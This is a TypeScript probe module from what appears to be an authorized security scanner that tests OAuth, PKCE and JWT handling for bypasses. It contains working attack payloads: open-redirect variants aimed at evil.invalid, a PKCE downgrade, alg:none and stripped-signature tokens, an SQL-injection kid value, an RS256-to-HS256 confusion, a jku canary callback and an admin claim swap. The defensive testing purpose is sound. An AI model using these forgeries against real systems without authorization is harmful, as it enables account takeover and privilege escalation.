// Probe family module — implementation moved verbatim from surface-engine.ts (no behavior change).
import type { BrokerHttpRequest, Grant } from '.././broker.ts'
import type { CanaryBroker } from '.././canary-broker.ts'
import { randToken, redirectBaseFromLocation, responseSimilarity } from './context.ts'
import type { DiffContext, DiffOutcome, InjectedRequest } from './context.ts'
import type { ProbeModule } from './registry.ts'



export async function diffAuthProtocolAudit(
  ctx: DiffContext,
  canaryBroker: CanaryBroker | undefined,
  grant: Grant,
): Promise<DiffOutcome> {
  const { req, runner, send, anomalies } = ctx
  const localLab = Boolean(grant.allowLocalLab && process.env.GUARDIAN_ALLOW_LOCAL_LAB === '1')
  const tier = grant.tier ?? 1
  const checks: Array<Record<string, unknown>> = []

  // Branch A: OAuth / OIDC redirect_uri & PKCE downgrade audit
  if (/redirect_uri=/i.test(req.pathAndQuery) || /oauth|authorize/i.test(req.pathAndQuery)) {
    const baseUrl = new URL(req.pathAndQuery, 'http://guardian.invalid')
    // Learn the app's registered redirect target behaviourally: when the caller did not supply a
    // redirect_uri, the authorize endpoint still issues its default 3xx Location. Use that host as the
    // baseline for substring/prefix bypass variants instead of assuming a hardcoded client origin.
    let origRedirect = baseUrl.searchParams.get('redirect_uri')
    if (!origRedirect) {
      const defaultEx = await send({ method: 'GET', pathAndQuery: req.pathAndQuery, headers: req.headers })
      const learned = redirectBaseFromLocation(defaultEx?.respHeaders.location ?? '')
      origRedirect = learned ?? 'https://app.example.invalid/cb'
      checks.push({ check: 'oauth_default_redirect_learned', learned: Boolean(learned), baselineHost: (() => { try { return new URL(origRedirect).hostname } catch { return null } })() })
    }
    const origParsed = (() => {
      try { return new URL(origRedirect) } catch { return new URL('https://app.example.invalid/cb') }
    })()

    const badControlUrl = new URL(baseUrl.pathname + baseUrl.search, 'http://guardian.invalid')
    badControlUrl.searchParams.set('redirect_uri', 'https://unrelated-control.invalid/cb')
    badControlUrl.searchParams.set('code_challenge_method', 'S256')
    badControlUrl.searchParams.set('code_challenge', 'E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM')
    const badCtrlEx = await send({ method: 'GET', pathAndQuery: badControlUrl.pathname + badControlUrl.search, headers: req.headers })

    const s256Url = new URL(baseUrl.pathname + baseUrl.search, 'http://guardian.invalid')
    s256Url.searchParams.set('redirect_uri', origParsed.href)
    s256Url.searchParams.set('code_challenge_method', 'S256')
    s256Url.searchParams.set('code_challenge', 'E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM')
    await send({ method: 'GET', pathAndQuery: s256Url.pathname + s256Url.search, headers: req.headers })

    const redirectVariants = [
      { name: 'userinfo_at', value: `https://${origParsed.host}@evil.invalid/cb` },
      { name: 'backslash_at', value: `https://${origParsed.host}\\@evil.invalid/cb` },
      { name: 'subdomain_prefix', value: `https://${origParsed.hostname}.evil.invalid/cb` },
      { name: 'suffix_match', value: `https://evil-${origParsed.hostname}/cb` },
    ]
    const badCtrlStatus = badCtrlEx?.status ?? 400
    for (const rv of redirectVariants) {
      const u = new URL(baseUrl.pathname + baseUrl.search, 'http://guardian.invalid')
      u.searchParams.set('redirect_uri', rv.value)
      u.searchParams.set('code_challenge_method', 'S256')
      u.searchParams.set('code_challenge', 'E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM')
      const ex = await send({ method: 'GET', pathAndQuery: u.pathname + u.search, headers: req.headers })
      if (!ex) continue
      const loc = ex.respHeaders.location ?? ''
      const accepted = (ex.status >= 300 && ex.status < 400 && (loc.includes('evil.invalid') || loc.includes(`evil-${origParsed.hostname}`))) ||
        (ex.status < 400 && badCtrlStatus >= 400)
      checks.push({ check: `oauth_redirect_${rv.name}`, status: ex.status, accepted })
      if (accepted) {
        anomalies.push({ type: 'oauth_redirect_differential', variant: rv.name, status: ex.status, location: loc })
      }
    }

    // PKCE downgrade to plain
    const pkcePlainUrl = new URL(baseUrl.pathname + baseUrl.search, 'http://guardian.invalid')
    pkcePlainUrl.searchParams.set('redirect_uri', origParsed.href)
    pkcePlainUrl.searchParams.set('code_challenge_method', 'plain')
    pkcePlainUrl.searchParams.set('code_challenge', 'plain-challenge-token-123456')
    const plainEx = await send({ method: 'GET', pathAndQuery: pkcePlainUrl.pathname + pkcePlainUrl.search, headers: req.headers })
    if (plainEx && plainEx.status >= 200 && plainEx.status < 400 && badCtrlStatus >= 400) {
      checks.push({ check: 'pkce_plain_downgrade', status: plainEx.status, accepted: true })
      anomalies.push({ type: 'pkce_downgrade', method: 'plain', status: plainEx.status })
    }
  }

  // Branch B: Broker-side JWT authMutation primitives
  if (req.persona && tier >= 2) {
    const validRes = await runner.send({
      origin: ctx.origin, method: req.method ?? 'GET', pathAndQuery: req.pathAndQuery,
      headers: req.headers, persona: req.persona, session: req.session, runId: req.runId, assignmentId: req.assignmentId,
    })
    const anonRes = await runner.send({
      origin: ctx.origin, method: req.method ?? 'GET', pathAndQuery: req.pathAndQuery,
      headers: req.headers, persona: undefined, session: req.session, runId: req.runId, assignmentId: req.assignmentId,
    })
    if (validRes.ok) runner.stage(validRes.ex)
    if (anonRes.ok) runner.stage(anonRes.ex)
    const anonRejected = !anonRes.ok || anonRes.ex.status === 401 || anonRes.ex.status === 403
    if (validRes.ok && validRes.ex.status >= 200 && validRes.ex.status < 300 && anonRejected) {
      let mintedJkuToken: string | null = null
      const mutList: Array<{ name: string; mutation: NonNullable<BrokerHttpRequest['authMutation']> }> = [
        { name: 'alg_none', mutation: { kind: 'alg_none' } },
        { name: 'strip_signature', mutation: { kind: 'strip_signature' } },
        { name: 'expired_replay', mutation: { kind: 'expired_replay', skewSeconds: 7200 } },
        { name: 'kid_inject', mutation: { kind: 'kid_inject', value: "1' OR '1'='1" } },
        { name: 'rs256_to_hs256_jwks', mutation: { kind: 'rs256_to_hs256_jwks', ...(req.jwksUrl ? { jwksUrl: req.jwksUrl } : {}) } },
      ]
      if (canaryBroker) {
        if (!canaryBroker.listenerInfo().running) await canaryBroker.startListener()
        const minted = canaryBroker.mintCanary(req.runId ?? 'auth-audit', 'jwt-jku', ctx.origin, req.storage ? { storage: req.storage, assignmentId: req.assignmentId } : undefined)
        mintedJkuToken = minted.token
        mutList.push({ name: 'jku_x5u_canary', mutation: { kind: 'jku_x5u_canary', header: 'jku', url: minted.httpUrl } })
      }
      if (localLab || tier >= 3) {
        mutList.push({ name: 'claim_swap', mutation: { kind: 'claim_swap', claims: { role: 'admin' } } })
      }
      for (const m of mutList) {
        const res = await runner.send({
          origin: ctx.origin, method: req.method ?? 'GET', pathAndQuery: req.pathAndQuery,
          headers: req.headers, persona: req.persona, authMutation: m.mutation,
          runId: req.runId, assignmentId: req.assignmentId,
        })
        if (!res.ok) continue
        runner.stage(res.ex)
        const sim = responseSimilarity(validRes.ex.body, res.ex.body)
        const ok2xx = res.ex.status >= 200 && res.ex.status < 300
        let canaryTriggered = false
        if (m.name === 'jku_x5u_canary' && canaryBroker && mintedJkuToken) {
          let check = canaryBroker.checkCanary(mintedJkuToken)
          for (let attempt = 0; attempt < 4 && !check.triggered; attempt += 1) {
            await new Promise(resolve => setTimeout(resolve, 60))
            check = canaryBroker.checkCanary(mintedJkuToken)
          }
          canaryTriggered = check.triggered
        }
        const accepted = (ok2xx && sim >= 0.85) || canaryTriggered
        checks.push({
          check: `jwt_${m.name}`,
          status: res.ex.status,
          similarity: sim,
          accepted,
          ...(m.name === 'jku_x5u_canary' ? { canaryTriggered } : {}),
        })
        if (ok2xx && sim >= 0.85) {
          anomalies.push({ type: 'jwt_auth_mutation_bypass', mutation: m.name, status: res.ex.status, similarity: sim })
        } else if (canaryTriggered) {
          anomalies.push({ type: 'jwt_jku_x5u_oob_canary', mutation: m.name, status: res.ex.status, canaryTriggered: true })
        }
      }
    }
  }

  // Branch C: forged token presented in a JSON/form body field (or bearer header) when the persona
  // is not a JWT credential. The payload subject/tenant is harvested from the target's own session
  // route, so no secret or benchmark knowledge is required. Control = same payload with a random
  // signature; probe = alg:none.
  const claims = req.identityClaims ?? {}
  const claimCandidates: Array<Record<string, unknown>> = []
  const subject = claims.email ?? claims.mail ?? claims.sub ?? claims.id ?? claims.userId
  const tenantClaim = claims.store ?? claims.tenant ?? claims.org ?? claims.workspace ?? claims.team
  // The scope-bearing payload goes first: a server that binds the read to a tenant claim is only
  // proven when the same claims are present in both the control and the forged token.
  if (tenantClaim || claims.role) {
    claimCandidates.push({
      ...(subject ? { sub: subject } : {}),
      ...(tenantClaim ? { store: tenantClaim, tenant: tenantClaim } : {}),
      ...(claims.role ? { role: claims.role } : {}),
      scope: 'read_write',
      ...(claims.id ? { uid: claims.id } : {}),
    })
  }
  if (subject) claimCandidates.push({ sub: subject })
  const b64u = (value: unknown): string => Buffer.from(JSON.stringify(value)).toString('base64url')
  const forge = (payload: Record<string, unknown>, alg: 'none' | 'HS256', signed: boolean): string => {
    const header = b64u({ alg, typ: 'JWT' })
    const body = b64u(payload)
    return signed ? `${header}.${body}.${randToken(43)}` : `${header}.${body}.`
  }
  if (claimCandidates.length > 0) {
    const methods = new Set<'body' | 'header'>()
    if ((req.method ?? 'GET') !== 'GET' && (req.tokenFields?.length ?? 0) > 0) methods.add('body')
    if (/authorization|bearer|reports?\/(?:sales|summary)|api\/(?:v\d+\/)?(?:tokens?|reports?|session)/i.test(req.pathAndQuery)) methods.add('header')
    for (const transport of methods) {
      const candidates = transport === 'body' ? (req.tokenFields ?? []).slice(0, 3) : ['authorization']
      let detected = false
      for (const field of candidates) {
        for (const payload of claimCandidates.slice(0, 2)) {
          // Both tokens are self-minted and carry an empty signature: the broker only permits that
          // shape (a real signed token would be blocked), and the control must still be rejected by
          // the target because the signature is not valid for HS256.
          const control = forge(payload, 'HS256', false)
          const probe = forge(payload, 'none', false)
          const request = (token: string): InjectedRequest => transport === 'body'
            ? { method: (req.method ?? 'POST'), pathAndQuery: req.pathAndQuery, headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ...(req.jsonBody ?? {}), [field]: token }) }
            : { method: (req.method ?? 'GET'), pathAndQuery: req.pathAndQuery, headers: { Authorization: `Bearer ${token}` } }
          const controlRes = await send(request(control))
          if (!controlRes || controlRes.status < 400 || controlRes.status >= 500) continue
          const probeRes = await send(request(probe))
          if (!probeRes || probeRes.status < 200 || probeRes.status >= 300) continue
          if (controlRes.status === probeRes.status && responseSimilarity(controlRes.body, probeRes.body) >= 0.98) continue
          // Positive acceptance signal: the accepted response must carry the authenticated read
          // itself (a JSON object with data fields), not a bare status/ack. A status-only claim is
          // never jwt evidence.
          let acceptedJson: Record<string, unknown> | null = null
          try {
            const parsed: unknown = JSON.parse(probeRes.body)
            if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) {
              acceptedJson = parsed as Record<string, unknown>
            }
          } catch { acceptedJson = null }
          const dataFields = acceptedJson
            ? Object.keys(acceptedJson).filter(field => !/^(?:ok|success|status|error|message|detail|reason|code)$/i.test(field))
            : []
          if (!acceptedJson || dataFields.length === 0) continue
          anomalies.push({
            type: transport === 'body' ? 'jwt_body_token_bypass' : 'jwt_authorization_forgery',
            path: req.pathAndQuery.split('?')[0],
            method: req.method ?? 'POST',
            mutation: 'alg_none',
            transport,
            tokenTransport: transport === 'body' ? 'json' : 'header',
            encoding: 'json',
            tokenField: field,
            subject: typeof payload.sub === 'string' ? payload.sub : (typeof payload.store === 'string' ? payload.store : undefined),
            body: transport === 'body' ? { ...(req.jsonBody ?? {}) } : undefined,
            controlStatus: controlRes.status,
            acceptedStatus: probeRes.status,
            similarity: responseSimilarity(controlRes.body, probeRes.body),
            claims: Object.keys(payload),
            payload,
            dataFields: dataFields.slice(0, 8),
            declaredAlg: 'HS256',
            acceptedAlg: 'none',
          })
          checks.push({ check: `jwt_forged_${transport}_${field}`, controlStatus: controlRes.status, acceptedStatus: probeRes.status, dataFields: dataFields.slice(0, 8), accepted: true })
          detected = true
          break
        }
        if (detected) break
      }
    }
  }

  return {
    verdict: anomalies.length > 0 ? 'signal' : 'no_signal',
    summary: anomalies.length > 0
      ? `Auth protocol differential detected ${anomalies.length} issue(s); build an auth_protocol_proof Replay Spec.`
      : 'No OAuth/PKCE or JWT mutation bypass signals observed.',
    details: { checks, suggestedReplayKind: 'auth_protocol_proof' },
  }
}

export const jwtProbe: ProbeModule = {
  family: 'jwt',
  classes: ['auth_protocol_audit'],
  run: (ctx, deps) => diffAuthProtocolAudit(ctx, deps.canaryBroker, deps.grant),
}
